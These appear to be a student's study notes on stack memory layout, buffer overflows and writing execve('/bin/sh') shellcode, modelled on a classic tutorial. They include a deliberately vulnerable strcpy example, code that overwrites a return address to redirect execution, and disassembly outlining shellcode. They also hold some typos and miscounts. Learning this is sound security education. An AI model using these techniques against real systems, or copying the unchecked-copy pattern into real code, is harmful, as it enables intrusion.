Text segment: fixed by program and includes instructions and read-only data.
	- attempting to write to it will result in a segmentation violation
Data segment: Contains initialized and uninitialized data
	- static variables
	- size can be changed wtih brk(2) system call 
	|	Text		|
	|			|
	|___________	______|
	|	initialized 	|
	|	and		|
	|	uninitialized	|
	|_________________|
	|	Stack		|
	|_________________|

Stack: procedure call alters the flow of control in the program but returns when finished
	- dynamically allocate the local variables used in functions, to pass parameters to the functions and to return values
Stack Region: Contiguous block of memory containing data. 
	- a stack pointer points to the top of the stack 
	- bottom is a fixed address 
	- size is adjusted at run time by kernel 
	- Push on/pop off
	- Stack Frames: 
		- pushed onto and popped off
		- contains parameters to a function
		- local variables
		- data necessary to recover the previous stack frame
		- value of instruction pointer
	- may grow up or down depending on implementation
		- this is how it is for intel machines, *IMPORTANT*
	- SP depends on implementation
		- may point to last address on stack OR next free available address
	- FP (Frame Pointer): points to a fixed location in frame 
		- Used by many compilers to reference local vars and parameters 
	- Accessing aa var at a known distance from SP requires multiple machine instructions
	- procedures must save the previous FP first to ensure it knows where to go when done
	example code: 
	void fucntion(int a, int b, int c){
		char buffer1[5];
		char buffer2[10];
	}

	void main(){
		function(1, 2, 3);
	}

	We can see in terminal what the code looks like in assembly with
	gcc -S -o example1.s example1.c
	Call to function is translated to: 
	push1 $3
	push1 $2
	push1 $1
	call fucntion *pushes the instruction pointer onto the stack*
	procedure prolog: 
	push1 %ebp		//pushes frame pointer onto stack
	mov1 %esp, %ebp	//copies the current SP onto EBP making it the new FP pointer SFP (saved frame pointer)
	sub1 $20, %esp	//allocates space for local variables by subtracting their size from SP

	- memory is addressed by the word size, for our systems we are using 64 bit, which is a quad word
	
bottom of memory									top of memory
	  buffer2		  buffer1	   sfp	   ret	   a	  b	   c
<----------[			] [		] [	] [	] [	] [	] [	]
top of stack										bottom of stack 

	- imagine this in a 64 bit system each allocation of buffer is given a block of 64 bits
	- meaning that buffer1 fits but buffer2 does not
	- for example: 1 char = 1 byte => buffer[10] -> 10chars X 8 bits => 80 bits used, 
	so we would need TWO blocks to allocate buffer whereas for buffer1 -> 5chars X 8bits => 40 bits so 1 block of data 
	buffer[10] > 64bits -> 2 blocks -> 128 bits in a 64 bit system
	buffer[5] < 64bits -> 1 block -> 64 bits in a 64 bit system 

Buffer Overflows: 
	- result of stuffing more data into a buffern than it can handle
	example code: 
	example2.c
	void functioni(char *str){
		char buffer[16];
		strcpy(buffer, str);
	}

	void main(){
		char large_string[256];
		int i; 
		for ( i = 0; i < 255; i++){
			large_string[i] = 'A';
		}
		function(large_string);
	}
		
	- function copies a supplied string without bounds checking by using strcpy()
	- segmentation violation will occur and looks like:

	bottom of memory										top of memory
			buffer				sfp		ret		*str
	<-------[				] [		] [		] [		]
	top of stack											bottom of stack

		- This is an issue because str is much larger than the buffer that is accepting it
		- Because buffer is 16 bytes and str is 256 bytes there are 250 bytes after the buffer will be overwritten
		- Because the code is copying 'A' into available spaces the segmentation fault will occur because the return address now stores 
		'A' or 0x41 and the return address is now 0x41414141 in a 32 bit system, in a 64 it would be 0x4141414141414141
		- We can change the flow of execution by changing the return address

		- If we notice in the example before, buffer1 is 64 bits long, we then have sfp is also 64 bit, and then return address
		this means 16 bytes from the beginning of buffer1 to the return address

		example3.c //accessing the return address
		void function(int a, int b, int c){
			char buffer1[5];
			char buffer2[10];
			int *ret;

			ret = buffer1 + 16;					//adds 16 to the buffer1 address
			(*ret) += 8;
		}

		void main(){
			int x;

			x = 0;
			function(1, 2, 3);
			x = 1;
			printf("%d\n", x);
		}

		- test values were used with gdb to understand why we add 8 to ret
		gdb example 3: 
		0x8000490 <main>:       pushl  %ebp
		0x8000491 <main+1>:     movl   %esp,%ebp
		0x8000493 <main+3>:     subl   $0x4,%esp
		0x8000496 <main+6>:     movl   $0x0,0xfffffffc(%ebp)
		0x800049d <main+13>:    pushl  $0x3
		0x800049f <main+15>:    pushl  $0x2
		0x80004a1 <main+17>:    pushl  $0x1
		0x80004a3 <main+19>:    call   0x8000470 <function>				//calling function
		0x80004a8 <main+24>:    addl   $0xc,%esp
		0x80004ab <main+27>:    movl   $0x1,0xfffffffc(%ebp)			//return address that we want to jump past 
		0x80004b2 <main+34>:    movl   0xfffffffc(%ebp),%eax			//we want to execute here. 
		0x80004b5 <main+37>:    pushl  %eax
		0x80004b6 <main+38>:    pushl  $0x80004f8
		0x80004bb <main+43>:    call   0x8000378 <printf>
		0x80004c0 <main+48>:    addl   $0x8,%esp
		0x80004c3 <main+51>:    movl   %ebp,%esp
		0x80004c5 <main+53>:    popl   %ebp
		0x80004c6 <main+54>:    ret
		0x80004c7 <main+55>:    nop

Shell Code: 
	- we want to place the code we are trying to execute into the buffer we are overwhelming, and overwrite the return address 
	so it points back into the buffer
	assuming that the stack starts at address 0xFF, and S stands for code we want to execute:
	bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
	memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
           buffer                sfp   ret   a     b     c

<------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
           ^                            |
           |____________________________|
top of                                                            bottom of
stack                                                                 stack

and what it looks like in C.
shellcode.C
#include <stdio.h>
void main(){
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}

how does this look in gdb?
gcc -o shellcode -ggdb -static shellcode.C
gdb shellcode

Dump of assembler code for function main:
0x8000130 <main>:       pushl  %ebp							//Procedure prelude
0x8000131 <main+1>:     movl   %esp,%ebp						//
0x8000133 <main+3>:     subl   $0x8,%esp						//
0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)			//copies the address of the string "/bin/sh" into the 
											//first pointer of name[0]
											//name[0] = "/bin/sh";
0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)				//copy NULL into the second pointer of name[1]
											//name[1] = NULL;
0x8000144 <main+20>:    pushl  $0x0						//push arguments to execve() 
0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax				//load address of name[]
0x8000149 <main+25>:    pushl  %eax						//push the address of name[] onto stack
0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax				//load the address of "/bin/sh" into EAX reg
0x800014d <main+29>:    pushl  %eax						//push the address of "/bin/sh" onto stack
0x800014e <main+30>:    call   0x80002bc <__execve>				//calls execve() and pushes IP onto stack 
0x8000153 <main+35>:    addl   $0xc,%esp
0x8000156 <main+38>:    movl   %ebp,%esp
0x8000158 <main+40>:    popl   %ebp
0x8000159 <main+41>:    ret
End of assembler dump.
(gdb) disassemble __execve
Dump of assembler code for function __execve:
0x80002bc <__execve>:   pushl  %ebp						//Procedure prelude
0x80002bd <__execve+1>: movl   %esp,%ebp					//
0x80002bf <__execve+3>: pushl  %ebx						//
0x80002c0 <__execve+4>: movl   $0xb,%eax						//copy 0xb onto the stack, 
											//index to sys call table, where 11 is execve
0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx					//copy the address of "/bin/sh" into EBX
0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx				//copy the address of name[] into ECX
0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx				//copy address of the null pointer into %edx
0x80002ce <__execve+18>:        int    $0x80						//change into kernel mode
0x80002d0 <__execve+20>:        movl   %eax,%edx
0x80002d2 <__execve+22>:        testl  %edx,%edx
0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
0x80002d6 <__execve+26>:        negl   %edx
0x80002d8 <__execve+28>:        pushl  %edx
0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
0x80002de <__execve+34>:        popl   %edx
0x80002df <__execve+35>:        movl   %edx,(%eax)
0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
0x80002e6 <__execve+42>:        popl   %ebx
0x80002e7 <__execve+43>:        movl   %ebp,%esp
0x80002e9 <__execve+45>:        popl   %ebp
0x80002ea <__execve+46>:        ret
0x80002eb <__execve+47>:        nop
End of assembler dump.

Execve() system call: 
	a. Have null terminated string "/bin/sh"
	b. Have the address of the string "/bin/sh" 
	c. Copy 0xb into the EAX reg
	d. Copy address of the address of string "/bin/sh" into EBX reg
	e. Copy the address of the null long word into the EDX reg
	g. Execute the int $0x80 instruction

Now we look at the exit file
exit.c
#include <stdlib.h>
void main(){
	exit(0);
}

In gdb: gcc -o exit -static exit.c
	    gdb exit
Dump of assembler code for function _exit:
0x800034c <_exit>:      pushl  %ebp
0x800034d <_exit+1>:    movl   %esp,%ebp
0x800034f <_exit+3>:    pushl  %ebx
0x8000350 <_exit+4>:    movl   $0x1,%eax
0x8000355 <_exit+9>:    movl   0x8(%ebp),%ebx
0x8000358 <_exit+12>:   int    $0x80
0x800035a <_exit+14>:   movl   0xfffffffc(%ebp),%ebx
0x800035d <_exit+17>:   movl   %ebp,%esp
0x800035f <_exit+19>:   popl   %ebp
0x8000360 <_exit+20>:   ret
0x8000361 <_exit+21>:   nop
0x8000362 <_exit+22>:   nop
0x8000363 <_exit+23>:   nop
End of assembler dump.

Steps for exit: 
	a. have the null terminated string "/bin/sh"
	b. have the address of string "/bin/sh" followed by null long word
	c. copy 0xb into the EAX reg
	d. Copy the address of the aaddress of the string "/bin/sh" into EBX register
	e. copy the address of the string "/bin/sh" into the ECX reg
	f. Copy the address of the null long word into the EDX reg
	g. execute the int $0x80 instruction
	h. copy 0x1 into the EAX reg
	i. copy 0x0 int the EBX reg
	j. execute the int $0x80 instruction

We place the string after the code, by placing the address of the string and the null word after the array:
movl   string_addr,string_addr_addr
movb   $0x0,null_byte_addr
movl   $0x0,null_addr
movl   $0xb,%eax
movl   string_addr,%ebx
leal   string_addr,%ecx
leal   null_string,%edx
int    $0x80
movl   $0x1, %eax
movl   $0x0, %ebx
int    $0x80
/bin/sh string goes here.